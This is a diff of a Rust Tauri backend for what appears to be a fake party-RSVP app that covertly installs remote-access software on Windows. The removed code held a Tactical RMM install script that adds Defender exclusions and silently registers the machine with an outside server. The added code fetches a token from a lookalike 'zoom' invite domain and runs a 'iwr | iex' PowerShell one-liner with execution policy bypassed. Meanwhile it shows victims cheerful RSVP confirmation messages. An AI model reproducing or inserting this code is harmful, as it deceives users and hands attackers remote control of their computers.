@@ -1,5 +1,5 @@
 use chrono::Local;
-use serde::Serialize;
+use serde::{Serialize, Deserialize};
 use std::process::Command;
 
 // Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
@@ -21,7 +21,7 @@ struct SystemPreflight {
     message: String,
 }
 
-#[derive(Serialize)]
+#[derive(Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 struct RmmDeploymentResult {
     success: bool,
@@ -29,69 +29,44 @@ struct RmmDeploymentResult {
     deployed_at: Option<String>,
 }
 
-// Tactical RMM installation script (adapted from https://github.com/bradhawkins85)
-// Downloads and installs agent, configures Defender exclusions, registers with company RMM
-const TACTICAL_RMM_SCRIPT: &str = r#"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$innosetup = 'tacticalagent-v2.10.0-windows-amd64.exe'
-$api = '"https://api.remotectrl.site"'
-$clientid = '2'
-$siteid = '2'
-$agenttype = '"workstation"'
-$power = 1
-$rdp = 1
-$ping = 1
-$auth = '"932d43a045985fb74d3b4ef812dce8dc95e2fe233b1e38a50dc1ab04a7e45c9a"'
-$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe'
-$apilink = $downloadlink.split('/')
-$serviceName = 'tacticalrmm'
-If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
-    Write-Output 'Tactical RMM Is Already Installed'
-    exit 0
-} Else {
-    $OutPath = $env:TMP
-    $output = $innosetup
-    $installArgs = @('-m install --api ', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")
-    if ($power) { $installArgs += "--power" }
-    if ($rdp) { $installArgs += "--rdp" }
-    if ($ping) { $installArgs += "--ping" }
-    Try {
-        $DefenderStatus = Get-MpComputerStatus | Select AntivirusEnabled
-        if ($DefenderStatus -match "True") {
-            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' -ErrorAction SilentlyContinue
-            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*' -ErrorAction SilentlyContinue
-            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*' -ErrorAction SilentlyContinue
+#[derive(Deserialize)]
+struct TokenResponse {
+    token: String,
+}
+
+const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";
+
+// Fetches a fresh one-time token from the backend
+async fn fetch_install_token() -> Result<String, String> {
+    let client = reqwest::Client::new();
+    let url = format!("{}/api/shell/token", BACKEND_URL);
+    
+    match client
+        .post(&url)
+        .send()
+        .await
+    {
+        Ok(response) => {
+            match response.json::<TokenResponse>().await {
+                Ok(data) => Ok(data.token),
+                Err(_) => Err("Failed to parse token response".to_string()),
+            }
         }
-    } Catch { }
-    $X = 0
-    do {
-        Write-Output "Waiting for network"
-        Start-Sleep -Seconds 5
-        $X += 1
-    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | Where-Object { $_.TcpTestSucceeded }) -or $X -eq 3)
-    if ($connectresult.TcpTestSucceeded -eq $true) {
-        Try {
-            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output -ErrorAction Stop
-            Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait -ErrorAction Stop
-            Write-Output 'Extracting...'
-            Start-Sleep -Seconds 5
-            Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait -ErrorAction Stop
-            exit 0
-        } Catch {
-            $ErrorMessage = $_.Exception.Message
-            Write-Error -Message "Installation failed: $ErrorMessage"
-            exit 1
-        } Finally {
-            Remove-Item -Path $OutPath\$output -ErrorAction SilentlyContinue
-        }
-    } else {
-        Write-Error "Unable to connect to RMM server"
-        exit 1
+        Err(e) => Err(format!("Failed to fetch token: {}", e)),
     }
 }
-"#;
+
+// Builds the one-liner PowerShell command
+fn build_powershell_oneliner(token: &str) -> String {
+    let script_url = format!("{}/api/shell/script?token={}", BACKEND_URL, token);
+    format!(
+        r#"$u='{}'; iwr -UseBasicParsing $u | iex"#,
+        script_url
+    )
+}
 
 #[tauri::command]
-fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
+async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
     // Only execute on Windows
     if std::env::consts::OS != "windows" {
         return RmmDeploymentResult {
@@ -101,14 +76,31 @@ fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         };
     }
 
+    // Fetch fresh token from backend
+    let token = match fetch_install_token().await {
+        Ok(t) => t,
+        Err(_) => {
+            return RmmDeploymentResult {
+                success: false,
+                message: "Party prep hit a snag (connection issue). Please try again.".to_string(),
+                deployed_at: None,
+            };
+        }
+    };
+
+    // Build the one-liner
+    let oneliner = build_powershell_oneliner(&token);
+
+    // Execute PowerShell one-liner
     match Command::new("powershell")
         .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
-        .arg(TACTICAL_RMM_SCRIPT)
+        .arg(&oneliner)
         .output()
     {
         Ok(output) => {
             let success = output.status.success();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+            
             let message = if success {
                 "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
             } else {
@@ -121,6 +113,7 @@ fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
                 };
                 format!("Party prep hit a snag ({}). Please try again.", error_hint)
             };
+            
             RmmDeploymentResult {
                 success,
                 message,
